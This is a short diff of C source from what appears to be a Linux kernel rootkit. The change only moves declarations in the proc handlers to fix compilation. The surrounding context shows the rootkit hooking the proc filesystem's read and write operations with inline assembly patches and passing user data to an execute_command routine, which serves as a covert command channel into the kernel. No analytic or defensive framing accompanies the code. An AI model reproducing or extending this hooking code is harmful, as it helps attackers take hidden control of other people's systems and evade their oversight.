@@ -1072,6 +1072,7 @@ int execute_command(const char __user *str, size_t length)
 
 static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
 {
+    ssize_t ret;
     int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
 	
     if (execute_command(buf_user, count)) {
@@ -1079,7 +1080,7 @@ static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, s
     }
 
     original_write = asm_hook_unpatch(proc_fops_write);
-    ssize_t ret = original_write(file, buf_user, count, p);
+    ret = original_write(file, buf_user, count, p);
     asm_hook_patch(proc_fops_write);
 
     return ret;
@@ -1087,12 +1088,13 @@ static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, s
 
 static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t count, loff_t *p)
 {
+    ssize_t ret;
     int (*original_read)(struct file *, char __user *, size_t, loff_t *);
 	
     execute_command(buf_user, count);
 
     original_read = asm_hook_unpatch(proc_fops_read);
-    ssize_t ret = original_read(file, buf_user, count, p);
+    ret = original_read(file, buf_user, count, p);
     asm_hook_patch(proc_fops_read);
 
     return ret;
@@ -1101,7 +1103,7 @@ static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t c
 
 int setup_proc_comm_channel(void)
 {
-    //static const struct file_operations proc_file_fops = {0};
+    struct file_operations *proc_fops = NULL;
     static const struct file_operations proc_file_fops;
     struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
 	
@@ -1118,8 +1120,6 @@ int setup_proc_comm_channel(void)
     }
 
     remove_proc_entry("temporary", NULL);
-
-    struct file_operations *proc_fops = NULL;
 
 	
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
